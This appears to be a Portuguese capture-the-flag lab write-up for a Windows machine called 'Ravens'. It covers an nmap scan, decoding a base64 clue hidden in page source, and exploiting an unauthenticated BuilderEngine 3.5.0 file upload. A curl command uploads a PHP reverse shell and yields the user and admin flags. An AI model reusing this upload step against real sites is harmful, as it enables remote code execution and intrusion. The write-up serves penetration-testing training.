---
title: Ravens
category: EHPT
---

## Enumeração

### Scan inicial

- Full NMAP scan TCP

```plaintext
dcruz@kali:/dcruz/ehpt/ravens/scan$ cat full.nmap 
# Nmap 7.80 scan initiated Sat Jun 20 00:00:16 2020 as: nmap -p80,135,139,443,445,3306,3389,7680,49664,49665,49666,49667,49669,49670,49671 -A -Pn -oA full 10.0.0.11
Nmap scan report for 10.0.0.11
Host is up (0.00034s latency).

PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.37 ((Win32) OpenSSL/1.0.2p PHP/5.6.40)
|_http-server-header: Apache/2.4.37 (Win32) OpenSSL/1.0.2p PHP/5.6.40
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
443/tcp   open  ssl/http           Apache httpd 2.4.37 ((Win32) OpenSSL/1.0.2p PHP/5.6.40)
|_http-server-header: Apache/2.4.37 (Win32) OpenSSL/1.0.2p PHP/5.6.40
|_http-title: Bad request!
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql              MariaDB (unauthorized)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-06-20T03:01:37+00:00; +2s from scanner time.
7680/tcp  open  pando-pub?
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
49671/tcp open  msrpc              Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:15:5d:2a:16:31 (Microsoft)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-20T03:01:13
|_  start_date: 2020-06-20T01:38:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 20 00:02:35 2020 -- 1 IP address (1 host up) scanned in 138.90 seconds
```

### 80/TCP - Website

- Ao navegar para a pagina inicial fui redirecionado para a página `https://10.0.0.11/teste/index.php`. Esta página contém uma imagem e o seguinte código fonte

```html
<html>
<head><title>Teste PHP</title></head>
<body>
    <p>Olá Jovem </p> <img src="bino.png" alt="some text" width=800 height=600>
    <p>Muitas vezes uma porta leva a varios lugares, precisamos olhar com calma
    <p><p>muitas vezes usar de força bruta
    <p><p>
    <p><p>a
    <p><p>a
    <p><p> a
    <p><p>a
    <p><p> a
    <p><p>a
    <p><p>a
    <p><p>a
    <p><p>a
    <p><p>YnVpbGQvcGFnZS1jb2VsaG8tYnJhbmNvLW5lby5odG1s
    <p>
</body>
</html>
```

- Inspecionando o texto **YnVpbGQvcGFnZS1jb2VsaG8tYnJhbmNvLW5lby5odG1s**  não foi possível detectar nenhum tipo formato hash, porém verificando como algum conteúdo codificado, identificado que se trata de um **Base64** que foi decodificado, confome abaixo

```plaintext
dcruz@kali:/dcruz/ehpt/homelander/exploit$ echo -n 'YnVpbGQvcGFnZS1jb2VsaG8tYnJhbmNvLW5lby5odG1s' | base64 -d
build/page-coelho-branco-neo.html
```

- Acessando a página informada identificado que se tratava de um site criado com BuilderEngine.

## Exploração

- Verificando no searchsploit o produto utilizado para criar o site, encontrado uma vulnerabilidade de File Upload

```plaintext
dcruz@kali:/dcruz/ehpt/homelander$ searchsploit builderengine
---------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
BuilderEngine 3.5.0 - Arbitrary File Upload                           | php/webapps/40390.php
BuilderEngine 3.5.0 - Arbitrary File Upload and Execution (Metasploit | php/remote/42025.rb
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- Com base no que foi informado nos arquivos é possivel fazer o upload de um arquivo qualquer sem necessidade de se autenticar. feito isso utilizado um shell reverso PHP para Windows, conforme enumeração inicial executada e foi possível obter um shell reverso, através da execução da linha de comando abaixo, onde o arquivo a ser carregado já possui os apontamentos de endereço IP para upload

```bash
curl -F 'files=@/dcruz/ehpt/homelander/exploit/shell.php' http://10.0.0.14/build/themes/dashboard/assets/plugins/jquery-file-upload/server/php/
```

- Ao navegar ao site, foi obtido o shell reverso na maquina, possibilitando obter a flag de user e root

```plaintext
c:\Users\Administrator\Desktop>type admin.txt
type admin.txt
8be5044c51b1b9b37f50b33c7f4433
```

```plaintext
c:\Users\Eric Draven\Desktop>type user.txt
type user.txt
891b3a9ba0e97072aefa681132f933fd
```
